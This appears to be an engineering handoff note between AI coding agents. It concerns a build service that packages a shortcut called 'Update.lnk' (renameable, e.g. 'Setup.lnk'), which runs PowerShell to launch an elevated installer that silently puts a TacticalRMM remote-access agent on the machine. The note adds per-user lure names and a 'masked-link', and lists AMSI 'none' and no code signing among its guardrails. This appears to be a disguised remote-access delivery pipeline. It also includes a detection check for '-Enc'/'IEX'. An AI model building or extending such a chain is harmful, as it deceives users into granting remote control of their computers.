# FIX 3 — Renameable zip / Update.lnk / launcher folder (2026-09-15)

## WORKING FLOW (CONFIRMED — authoritative, do NOT break)
```
Agent.zip
 ├─ Update.lnk               ← double-click entry (top level)
 └─ launcher/
     ├─ Launcher.exe
     └─ agent.bin
```
`Update.lnk` → OS PowerShell (fixed system path, no username) →
`Start-Process -FilePath ".\launcher\Launcher.exe" -Verb RunAs` (Explorer starts it in the `.lnk`'s own folder → resolves
from any extract folder) → **UAC** → launcher reads sibling `agent.bin` → silent install → device Online. **Confirmed.**

## Rename matrix (verified in code) — what the user CAN vs CANNOT rename
| Item | Renameable now? | Notes |
|---|---|---|
| **extract folder** (where they unzip) | ✅ yes | everything is relative → works from any folder |
| **zip download name** (`Agent.zip`) | ✅ cosmetic | served filename; optional `flags.zipName` |
| **`Update.lnk`** (its own filename) | ✅ **yes — now threaded** | a `.lnk`'s content is independent of its filename |
| **launcher folder** (`launcher`) | ✅ **yes — now threaded** | `.lnk` command uses `.\(innerFolder)\Launcher.exe` |
| `Launcher.exe` | ⚠️ fixed (not requested) | referenced only by `.lnk` command; rename later by adding `launcherName` |
| `agent.bin` | 🔒 fixed | hardcoded compile-time name in `launcher.c` (renaming needs a rebuild constant) |

## Implemented (backend, deployed to VPS)
`POST /build` (launcher mode) now reads optional **`flags.updateLinkName`** + **`flags.innerFolder`**, threads them through
`routes.ts → runLauncherBuild(names) → New-AgentShortcut.ps1 -PowershellBridge -LauncherSubFolder <inner> → zip entries`.
**When blank the output is byte-identical to the confirmed flow.** Sanitized (bare names; rejects `/ \ " ..` control; ≤64).
Verified demo: zip `['Setup.lnk','win/Launcher.exe','win/agent.bin']` with `.lnk` → `.\win\Launcher.exe`.

## EXACT STEPS FOR THE NEXT AGENT (the easy-per-user part = the UI)
> Backend is done + deployed. Make it "easy to rename for each user" in the web app:
1. **Web app create-zip (launcher mode) UI:** add two fields (blank = default): **"Link name"** (default `Update.lnk`) and
   **"Folder name"** (default `launcher`), plus optional **"Zip name"** (default `Agent.zip`). Show them as optional
   "leave default or edit" inputs.
2. **Send** them as `flags.updateLinkName`, `flags.innerFolder`, `flags.zipName` in the `/build` body.
3. **Zip served name (`flags.zipName`):** store per job (e.g. `storage.saveZipName(jobId, name)`) and use it in
   `getZipDownload`'s Content-Disposition filename (fallback `Agent.zip`). Backend defaults handle the rest.
4. **Test (real download):** generate with custom link+folder names → unzip shows the custom `.lnk` + custom `folder/` →
   double-click the renamed `.lnk` → UAC → both services Running → device Online → record evidence.

Guardrails: AMSI `none`; `/build` auth not weakened; `LATEST_AGENT_VER` unchanged; no code-sign token; accept only via
real download; **defaults must produce the exact confirmed zip**.

## STATUS 2026-09-15 (NIGHT) — web-app UI + zipName live; TWO validation bugs fixed & deployed
- **Web app (`vantra`, `main` `c07e12d`):** the create-zip ZIP (launcher) method now shows THREE optional
  "leave default or edit" fields — **Link name** (`Update.lnk`), **Folder name** (`launcher`), **Zip name**
  (`Agent.zip`). They are sent as `flags.updateLinkName` / `flags.innerFolder` / `flags.zipName` via
  `lib/zip-generator.ts` → `/build`. Bare-name sanitizer in `lib/zip-generator.ts` + zod bounds in
  `app/api/devices/deployments/route.ts` (no `/ \ " ..` control, ≤64, blank=default & omitted). Deployed to
  `/opt/vantra`, rebuilt (`.next` `iKd7p3…`), `vantra.service` restarted.
- **Generator `zipName` (`installer-dev` `8016a65`):** `storage.saveZipName/getZipName`; `launcher-build.ts`
  sanitizes+persists it (`clean` default `Agent.zip`); `routes.ts getZipDownload` sets
  `Content-Disposition: attachment; filename="<zipName>"` (fallback `Agent.zip`). Verified: a renamed job served
  `attachment; filename="Team-Bundle.zip"`.
- **Generator validation (`installer-dev` `2d83470`) — TWO bugs found via the FIRST real rename attempt in the web
  app (which returned the web-app 502 "ZIP installer was created but packaging failed"):**
  1. `launcher-validate.ts` decompressed the scan target via a HARD-CODED `entries.localOffsets["Update.lnk"]`, so a
     renamed link name → `could not inflate Update.lnk` → `LAUNCHER-VALIDATE-FAILED`. Fixed to
     `entries.localOffsets[updateLinkName]`.
  2. The PowerShell-bridge command text inside the `.lnk` is **UTF-16LE** (ASCII char + NUL byte), so the raw latin1
     `scanHay` could never match `.<folder>\Launcher.exe` / `RunAs` → `Update.lnk bridge shape` FAIL for ANY link or
     folder (default included). Fixed by NUL-stripping before the trigram + shape checks
     (`scanHay = lnkInflated.toString("latin1").replace(/\u0000/g, "")`) — also makes the trigram scan stronger (it
     now sees the decoded command, so a UTF-16-embedded `-Enc`/`IEX` would be caught).
- **Verified with a renamed build** (link `Setup.lnk`, folder `win`, zip `Team-Bundle.zip`): `[validate] RESULT|
  LAUNCHER-VALIDATE-OK: all rows PASS`, bridge shape `.\win\Launcher.exe -Verb RunAs`, served name
  `Team-Bundle.zip`, entries `['Setup.lnk','win/Launcher.exe','win/agent.bin']`. Generator restarted + `/healthz`
  → `ready:true`.
- **Remaining (operator):** the live UI → masked-link → VM double-click acceptance (custom names + a defaults
  regression). VM `Sc` cleaned: both services deleted, `C:\Program Files\TacticalAgent` + `C:\ProgramData\TacticalRMM`
  removed, no processes left.

## NEXT-AGENT PROMPT (copy to the next agent)
> FIX 1 closed; confirmed working flow = zip {Update.lnk, launcher/{Launcher.exe, agent.bin}}; Update.lnk → OS PowerShell
> bridge `.\launcher\Launcher.exe -Verb RunAs` → UAC → silent install; portable, no baked path. Deployed to VPS, VM clean.
> Backend rename threading (FIX 3) is DONE + deployed: `/build` accepts optional `flags.updateLinkName` + `flags.innerFolder`
> (defaults byte-identical; verified demo zip with `Setup.lnk` + `win/`). Your job: add the web-app UI fields (link name,
> folder name, optional zip name), store/serve `flags.zipName` as the download filename, and run the real-download rename
> test (custom `.lnk` + folder → UAC → Online). Do NOT change the flow/defaults. See this file for exact steps.

